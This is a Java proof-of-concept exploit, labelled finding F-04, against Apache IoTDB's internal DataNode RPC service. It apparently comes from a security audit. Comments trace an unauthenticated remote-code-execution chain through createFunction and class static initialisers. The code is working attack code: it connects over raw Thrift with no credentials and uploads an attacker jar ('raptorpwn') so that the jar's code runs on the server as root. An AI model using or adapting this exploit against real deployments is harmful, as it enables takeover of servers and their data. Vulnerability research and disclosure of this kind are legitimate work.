import org.apache.iotdb.mpp.rpc.thrift.*;
import org.apache.iotdb.common.rpc.thrift.TSStatus;
import org.apache.iotdb.commons.udf.UDFInformation;
import org.apache.iotdb.commons.udf.UDFType;
import org.apache.tsfile.utils.Binary;
import org.apache.thrift.protocol.TBinaryProtocol;
import org.apache.thrift.transport.TSocket;
import org.apache.thrift.transport.TTransport;
import org.apache.thrift.transport.layered.TFramedTransport;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * F-04 — Unauthenticated RCE as root via the DataNode internal RPC createFunction (port 10730).
 *
 * Chain (Apache IoTDB v2.0.10, commit 3c26382b):
 *   - DataNodeInternalRPCServiceImpl.createFunction (:2944) calls
 *     UDFManagementService.register(udfInformation, req.jarFile) with NO authentication.
 *   - register -> Class.forName(className, initialize=true, loader) (UDFManagementService:178)
 *     runs the class static initializer. No handshake, no session, no credentials.
 *   - Siblings createTriggerInstance (:2968) and createPipePlugin (:3084) are identical.
 *
 * CONDITIONAL on reachability of port 10730. The stock standalone image does NOT publish it and
 * binds it to the node's internal address; a real cluster exposes it to peers by design. Rated
 * "Critical, conditional on internal-port reachability". Password-independent (no auth at all).
 *
 * Usage: java F04_InternalRpcRce <host> <10730> <path-to-raptorpwn.jar> [functionName]
 */
public class F04_InternalRpcRce {
  public static void main(String[] a) throws Exception {
    String host = a.length > 0 ? a[0] : "127.0.0.1";
    int port    = a.length > 1 ? Integer.parseInt(a[1]) : 10730;
    String jarPath = a.length > 2 ? a[2] : "/poc/raptorpwn.jar";
    String fn   = a.length > 3 ? a[3] : "validationudf";
    byte[] jar = Files.readAllBytes(Paths.get(jarPath));

    System.out.println("[F-04] " + Common.ts() + "  target=" + host + ":" + port
        + "  (raw Thrift, NO session, NO credentials)");
    TTransport tr = new TFramedTransport(new TSocket(host, port));
    tr.open();
    IDataNodeRPCService.Client c = new IDataNodeRPCService.Client(new TBinaryProtocol(tr));

    UDFInformation info = new UDFInformation(
        fn, "org.apache.iotdb.raptor.RaptorPwn", UDFType.TREE_AVAILABLE,
        true, fn + ".jar", "md5_" + fn);
    TCreateFunctionInstanceReq req = new TCreateFunctionInstanceReq(info.serialize());
    req.setJarFile(ByteBuffer.wrap(jar));
    TSStatus st = c.createFunction(req);
    System.out.println("[F-04] createFunction(" + fn + ")        -> " + Common.code(st));
    System.out.println("[F-04] " + Common.ts()
        + "  If code=200, the UDF class static initializer ran on the server (see /tmp marker + server log).");
  }
}
